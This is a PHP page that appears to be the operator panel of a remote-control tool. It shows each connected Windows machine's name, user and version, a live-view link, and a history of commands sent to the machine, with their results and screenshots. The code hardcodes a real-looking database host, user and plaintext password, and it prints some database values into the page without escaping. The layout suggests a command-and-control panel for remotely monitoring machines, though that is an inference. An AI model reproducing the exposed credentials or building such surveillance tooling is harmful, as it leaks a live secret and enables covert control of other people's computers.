<?php
// View client details and command history
session_start();

if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header('Location: index.php');
    exit;
}

// Database configuration - PostgreSQL (Supabase Connection Pooler - Transaction Mode)
// Using IPv4 pooler for Render compatibility
$db_host = 'aws-0-us-east-1.pooler.supabase.com';
$db_name = 'postgres';
$db_user = 'postgres.mljxejdqoxraqimxjhnn';
$db_pass = 'Palette1853141!';
$db_port = 6543;  // Pooler port (NOT 5432)

try {
    $pdo = new PDO("pgsql:host=$db_host;port=$db_port;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Database connection failed!");
}

$client_id = isset($_GET['id']) ? $_GET['id'] : 0;

// Get client info
$stmt = $pdo->prepare("SELECT * FROM clients WHERE id = ?");
$stmt->execute([$client_id]);
$client = $stmt->fetch(PDO::FETCH_ASSOC);

if(!$client) {
    die("Client not found!");
}

// Get commands for this client
$stmt = $pdo->prepare("SELECT * FROM commands WHERE client_id = ? ORDER BY created_at DESC LIMIT 50");
$stmt->execute([$client['client_id']]);
$commands = $stmt->fetchAll(PDO::FETCH_ASSOC);

// Get logs for this client
$stmt = $pdo->prepare("SELECT * FROM logs WHERE client_id = ? ORDER BY created_at DESC LIMIT 100");
$stmt->execute([$client['client_id']]);
$logs = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Client Details - <?= htmlspecialchars($client['client_id']) ?></title>
    <meta http-equiv="refresh" content="10">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0e27; color: #eee; padding: 20px; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .back-btn { background: #3282b8; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; }
        .client-info { background: #16213e; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
        .info-item { padding: 10px; background: #0f4c75; border-radius: 5px; }
        .info-item label { display: block; color: #aaa; font-size: 0.9em; margin-bottom: 5px; }
        .info-item value { display: block; font-size: 1.1em; font-weight: bold; }
        .section { background: #16213e; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .section h2 { margin-bottom: 15px; color: #3282b8; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #0f4c75; padding: 12px; text-align: left; }
        td { padding: 10px 12px; border-bottom: 1px solid #1a1a2e; }
        tr:hover { background: #1a1a2e; }
        .status-pending { color: #ffd43b; }
        .status-executing { color: #74c0fc; }
        .status-completed { color: #51cf66; }
        .status-failed { color: #ff6b6b; }
        code { background: #0a0e27; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; }
        .result-box { max-height: 200px; overflow-y: auto; background: #0a0e27; padding: 10px; border-radius: 5px; font-family: monospace; white-space: pre-wrap; word-break: break-all; }
        .log-info { color: #74c0fc; }
        .log-warning { color: #ffd43b; }
        .log-error { color: #ff6b6b; }
        .log-command_executed { color: #51cf66; }
        .btn { background: #3282b8; color: white; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <a href="index.php" class="back-btn">← Back to Dashboard</a>
            <a href="live_view_smooth.php?client_id=<?= $client['id'] ?>" class="back-btn" style="background: #51cf66; margin-left: 10px;">🎥 Live View</a>
        </div>
        <h1>Client Details: <?= htmlspecialchars($client['computer_name']) ?></h1>
    </div>
    
    <div class="client-info">
        <h2>Client Information</h2>
        <div class="info-grid">
            <div class="info-item">
                <label>Client ID</label>
                <value><code><?= htmlspecialchars($client['client_id']) ?></code></value>
            </div>
            <div class="info-item">
                <label>Computer Name</label>
                <value><?= htmlspecialchars($client['computer_name']) ?></value>
            </div>
            <div class="info-item">
                <label>Username</label>
                <value><?= htmlspecialchars($client['username']) ?></value>
            </div>
            <div class="info-item">
                <label>Windows Version</label>
                <value><?= htmlspecialchars($client['windows_version']) ?></value>
            </div>
            <div class="info-item">
                <label>First Seen</label>
                <value><?= date('Y-m-d H:i:s', strtotime($client['first_seen'])) ?></value>
            </div>
            <div class="info-item">
                <label>Last Seen</label>
                <value><?= date('Y-m-d H:i:s', strtotime($client['last_seen'])) ?></value>
            </div>
            <div class="info-item">
                <label>Status</label>
                <value><?= strtotime($client['last_seen']) > time() - 60 ? '🟢 Online' : '🔴 Offline' ?></value>
            </div>
        </div>
    </div>
    
    <div class="section">
        <h2>Command History</h2>
        <?php if(empty($commands)): ?>
            <p>No commands sent yet.</p>
        <?php else: ?>
        <table>
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Command Type</th>
                    <th>Command Data</th>
                    <th>Status</th>
                    <th>Result</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach($commands as $cmd): ?>
                <tr>
                    <td><?= date('Y-m-d H:i:s', strtotime($cmd['created_at'])) ?></td>
                    <td><code><?= htmlspecialchars($cmd['command_type']) ?></code></td>
                    <td><?= htmlspecialchars(substr($cmd['command_data'], 0, 50)) ?><?= strlen($cmd['command_data']) > 50 ? '...' : '' ?></td>
                    <td class="status-<?= $cmd['status'] ?>"><?= strtoupper($cmd['status']) ?></td>
                    <td>
                        <?php if(!empty($cmd['result'])): ?>
                            <?php if(strpos($cmd['result'], 'SCREENSHOT:') === 0): ?>
                                <a href="view_screenshot.php?data=<?= urlencode($cmd['result']) ?>" target="_blank" class="btn" style="background: #51cf66;">📸 View Screenshot</a>
                            <?php else: ?>
                                <div class="result-box"><?= htmlspecialchars($cmd['result']) ?></div>
                            <?php endif; ?>
                        <?php else: ?>
                            <em>No result yet</em>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        <?php endif; ?>
    </div>
    
    <div class="section">
        <h2>Activity Logs</h2>
        <?php if(empty($logs)): ?>
            <p>No logs yet.</p>
        <?php else: ?>
        <table>
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Type</th>
                    <th>Message</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach($logs as $log): ?>
                <tr class="log-<?= $log['log_type'] ?>">
                    <td><?= date('Y-m-d H:i:s', strtotime($log['created_at'])) ?></td>
                    <td><code><?= htmlspecialchars($log['log_type']) ?></code></td>
                    <td><?= htmlspecialchars($log['message']) ?></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        <?php endif; ?>
    </div>
</body>
</html>
